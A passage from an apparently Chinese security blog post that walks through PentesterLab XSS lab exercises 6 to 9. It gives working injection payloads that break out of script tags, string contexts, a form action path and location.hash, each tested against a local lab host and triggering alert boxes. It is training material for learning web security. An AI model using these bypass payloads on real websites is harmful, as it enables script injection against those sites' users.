<p> <img src="http://ombgvjpli.bkt.clouddn.com/1487085310932.png" alt="image"><br>来查看下源码来简单的分析一下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Hello </div><div class="line">&lt;script&gt;</div><div class="line">	var $a= &quot;11&quot;;&lt;/script&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;&lt;script&gt;&quot;;</div><div class="line">&lt;/script&gt;</div><div class="line">	      &lt;footer&gt;</div><div class="line">        &lt;p&gt;&amp;copy; PentesterLab 2013&lt;/p&gt;</div><div class="line">      &lt;/footer&gt;</div></pre></td></tr></table></figure></p>
<p>pauyload最前面的<br><code>11&quot;;&lt;/script&gt;</code>    闭合了前面的<code>&lt;script&gt;</code>标签<br>最后面的<br><code>&lt;script&gt;</code>     闭合了后面的<code>&lt;script&gt;</code>标签<br>中间的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;</div></pre></td></tr></table></figure></p>
<p>用来触发 弹窗事件</p>
<h1 id="第7题"><a href="#第7题" class="headerlink" title="第7题"></a>第7题</h1><p>首先来查看下源码:<br><img src="http://ombgvjpli.bkt.clouddn.com/1487085866489.jpg" alt="image"><br>感觉貌似和第6题差不多，于是稍微修改了下使用下面的payload来进行测试:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hacker&apos;;&lt;/script&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;&lt;script&gt;</div></pre></td></tr></table></figure></p>
<p>结果并没有弹窗，赶紧查看下源码压压惊:<br><img src="http://ombgvjpli.bkt.clouddn.com/1487086044647.png" alt="image"><br>可以看到对输入的 <code>&lt;</code>和<code>/</code>和<code>&gt;</code>符号进行转义了，导致我们的弹窗失败。<br>所以现在的着重点就是 如何处理这些符号:<br><code>&lt;</code>和<code>/</code>和<code>&gt;</code><br>然而我失败了，对这些符号进行转码也是失败了，后来想了好久终于知道问题所在了:<br>受到以前闭合一句话木马的缘故,我老是想着闭合首尾的标签<br>后来仔细想想，这个变量 就在<code>&lt;script&gt;</code>里面，可以在里面直接写alert(‘xss’)来弹窗的，这样也就不需要使用<br><code>&lt;</code>和<code>/</code>和<code>&gt;</code>特殊符号了。这么看来的话，第6题 也应该这么来做，奇葩的我，居然是闭合的方式来弹窗的….<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.211.55.16/xss/example6.php?name=name=&quot;;alert(&apos;xss&apos;);var b=&quot;</div></pre></td></tr></table></figure></p>
<p><img src="http://ombgvjpli.bkt.clouddn.com/1487087759277.png" alt="image"><br>查看下源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Hello </div><div class="line">&lt;script&gt;</div><div class="line">	var $a= &quot;name=&quot;;alert(&apos;xss&apos;);var b=&quot;&quot;;</div><div class="line">&lt;/script&gt;</div><div class="line">	      &lt;footer&gt;</div><div class="line">        &lt;p&gt;&amp;copy; PentesterLab 2013&lt;/p&gt;</div><div class="line">      &lt;/footer&gt;</div></pre></td></tr></table></figure></p>
<p>这里 巧妙的利用了 <code>;</code> 来在<code>&lt;script&gt;</code>标签里面执行<code>alert(&#39;xss&#39;)</code></p>
<h1 id="第8题"><a href="#第8题" class="headerlink" title="第8题"></a>第8题</h1><p>是一个输入框,然后输入payload:<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code>；来试试看,查看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HELLO &amp;lt;img src=1 onerror=alert(&apos;xss&apos;)&amp;gt;&lt;form action=&quot;/xss/example8.php&quot; method=&quot;POST&quot;&gt;</div><div class="line">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</div><div class="line">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</div><div class="line"></div><div class="line">      &lt;footer&gt;</div><div class="line">        &lt;p&gt;&amp;copy; PentesterLab 2013&lt;/p&gt;</div><div class="line">      &lt;/footer&gt;</div></pre></td></tr></table></figure></p>
<p>发现也是对  <code>&lt;</code>  <code>&gt;</code> 标签进行转义了，这里进行各种编码也没有绕过。<br>又是好久也没有成功突破，最后仔细看源码，发现突破点在于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;/xss/example8.php&quot;</div></pre></td></tr></table></figure></p>
<p>这是第8题的URL,于是注意力转移到URL处，尝试在URL后面添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.211.55.16/xss/example8.php/</div></pre></td></tr></table></figure></p>
<p>查看源码：<br><img src="http://ombgvjpli.bkt.clouddn.com/1487088695901.png" alt="image"><br>发现我们最后添加的 :<code>/</code> 写在了<code>&lt;form&gt;</code>这个标签中，于是在这里进行fuzz测试，尝试闭合标签，最后构造的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.211.55.16/xss/example8.php/&quot;&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;&lt;form</div></pre></td></tr></table></figure></p>
<p>来查看下源码来分析刚刚构造的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;/xss/example8.php/&quot;&gt;&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;&lt;form&quot; method=&quot;POST&quot;&gt;</div><div class="line">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</div><div class="line">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</div></pre></td></tr></table></figure></p>
<p>可以看到这里<br><code>/&quot;</code>闭合了最前面的<code>&lt;form&gt;</code><br><code>&lt;form&gt;</code> 闭合了最后面的<code>/&gt;</code><br>中间的<br><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code>  触发了弹窗事件</p>
<h1 id="第9题"><a href="#第9题" class="headerlink" title="第9题"></a>第9题</h1><p>这一题很特殊，不愧是大boss，这里首先查看下源码:<br><img src="http://ombgvjpli.bkt.clouddn.com/1487089477245.png" alt="image"><br>在源码中完全找不到<code>hacker</code>的任何字样，于是仔细百度最可疑的地方:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">  document.write(location.hash.substring(1));</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>找到一份资料：<a href="http://www.runoob.com/jsref/prop-loc-hash.html" target="_blank" rel="external">http://www.runoob.com/jsref/prop-loc-hash.html</a><br>这里可以大概看出这里是读取<code>#</code>后面的东西，于是乎简单的在<code>#</code>后面构造xss语句:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.211.55.16/xss/example9.php#&lt;img src=http://www.sqlsec.com/favicon.ico onclick=alert(&apos;Bingo&apos;)&gt;</div></pre></td></tr></table></figure></p>
<p>最后一道题目了，得录制个gif来庆祝一下：<br><img src="http://ombgvjpli.bkt.clouddn.com/22g.gif" alt="image"></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>虽然这个平台只有9道题目，但是用心去整理拓展，发现可以学到很多xss的姿势，这样又把以前快忘记的xss姿势巩固提高了一下，更好的为不久后挖BAT的XSS漏洞做好基础知识的准备。</p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
    <p><span>本文标题:</span><a href="/2017/02/15/pentester/">Pentester中的XSS详解</a></p>
 
    <!-- modify author information
    <p><span>文章作者:...
    -->
    <p><span>文章作者:</span>国光</p>
 
    <p><span>发布时间:</span>2017-02-15, 00:00:00</p>
    <p><span>最后更新:</span>2020-05-03, 00:03:41</p>
    <p>
        <span>...
        <script> var clipboard = new Clipboard('.copy-path'); </script>
    </p>
 
    <!-- not to show license information
    <p>
        <span>...
    </p>
    -->
</div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2017/03/23/dpmsf/">
                    Deepin Linux下的Metasploit安装及优化
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2017/01/14/docker/">
                    Docker入门简明教程
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#第1题-无过滤措施"><span class="toc-number">1.</span> <span class="toc-text">第1题(无过滤措施)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用基本的script标签来弹窗"><span class="toc-number">1.1.</span> <span class="toc-text">利用基本的script标签来弹窗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">1.1.1.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#定义和用法"><span class="toc-number">1.1.2.</span> <span class="toc-text">定义和用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#效果图"><span class="toc-number">1.1.3.</span> <span class="toc-text">效果图</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用iframe标签的的src属性来弹窗"><span class="toc-number">1.2.</span> <span class="toc-text">利用iframe标签的的src属性来弹窗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#定义和用法-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">定义和用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#效果图-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">效果图</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签的href属性来弹窗"><span class="toc-number">1.3.</span> <span class="toc-text">利用标签的href属性来弹窗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#定义和用法-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">定义和用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#效果图-2"><span class="toc-number">1.3.3.</span> <span class="toc-text">效果图</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签来弹窗"><span class="toc-number">1.4.</span> <span class="toc-text">利用标签来弹窗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#列举出常见的事件"><span class="toc-number">1.4.2.</span> <span class="toc-text">列举出常见的事件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows事件属性"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">Windows事件属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Keyboard-事件"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">Keyboard 事件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#鼠标（Mouse）事件"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">鼠标（Mouse）事件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#定义和用法-3"><span class="toc-number">1.4.3.</span> <span class="toc-text">定义和用法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#列举出一些支持事件的HTML常见标签"><span class="toc-number">1.5.</span> <span class="toc-text">列举出一些支持事件的HTML常见标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#综合点的payload"><span class="toc-number">1.6.</span> <span class="toc-text">综合点的payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第2题-大小写转换"><span class="toc-number">2.</span> <span class="toc-text">第2题(大小写转换)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第3题-嵌套构造"><span class="toc-number">3.</span> <span class="toc-text">第3题(嵌套构造)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第4题-利用标签绕过"><span class="toc-number">4.</span> <span class="toc-text">第4题(利用标签绕过)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第5题-String-fromCharCode编码绕过"><span class="toc-number">5.</span> <span class="toc-text">第5题(String.fromCharCode编码绕过)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第6题-闭合标签"><span class="toc-number">6.</span> <span class="toc-text">第6题(闭合标签)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第7题"><span class="toc-number">7.</span> <span class="toc-text">第7题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第8题"><span class="toc-number">8.</span> <span class="toc-text">第8题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第9题"><span class="toc-number">9.</span> <span class="toc-text">第9题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#小结"><span class="toc-number">10.</span> <span class="toc-text">小结</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a> 
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"Pentester中的XSS详解　| StupidDog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2017/03/23/dpmsf/" title="上一篇: Deepin Linux下的Metasploit安装及优化">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2017/01/14/docker/" title="下一篇: Docker入门简明教程">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/05/03/拖延症患者回来了！/">拖延症患者回来了！</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/12/ç«¯å£æ«æ/"> 端口扫描</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/phpä»£ç åå­¦ä¹ -é¿æå¼å-ä¸ºè¿ä¸æ­¥å­¦ä¹ ä»£ç å®¡è®¡ååå¤/">php再学习(长期开坑,为进一步学习代码审计做准备)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/10/åå®¢æ¢æhexoçå°è®°/">博客换成hexo的小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/19/hexo/">Hexo博客配置笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/23/dpmsf/">Deepin Linux下的Metasploit安装及优化</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/15/pentester/">Pentester中的XSS详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/14/docker/">Docker入门简明教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/29/pentestbox/">PentestBox简明使用教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/wifi/">无线安全之破解WPA/WPA2 加密ＷiFi</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/04/web/">信息收集之网站镜像克隆</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/04/diykali/">开启你的kali linux DIY之旅(基于kali linux2016.2)</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2016-2020 Dogboy
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 5;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>



<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97084848-2', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->



<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

    <script>
        var originTitle = document.title;
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
                clearTimeout(titleTime);
            }
            else {
                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
                titleTime = setTimeout(function() {
                    document.title = originTitle;
                }, 2000);
            }
        })
    </script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>